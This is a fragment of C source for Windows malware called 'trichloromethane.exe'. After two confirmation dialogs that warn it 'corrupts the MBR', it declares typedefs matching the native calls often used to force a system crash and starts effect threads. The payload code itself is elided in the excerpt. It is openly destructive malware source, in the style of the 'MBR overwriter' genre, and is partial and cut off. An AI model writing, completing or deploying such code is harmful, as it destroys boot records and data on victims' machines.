...
#include "effects.h"
#include "sound.h"
#include "disruction.h"
typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {

	if (MessageBoxW(NULL, L"trichloromethane.exe Run? malware?.", L"trichloromethane.exe", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
	{
		ExitProcess(0);
	}
	else
	{
		if (MessageBoxW(NULL, L"Are you sure final chance of stoping it. It corrupts the MBR", L"trichloromethane.exe", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
		{
			ExitProcess(0);
		}
		else
		{
            		...
            		HANDLE thread0D1 = CreateThread(0, 0, d, 0, 0, 0);            		
			HANDLE thread0D2 = CreateThread(0, 0, input, 0, 0, 0);
			Sleep(5000);
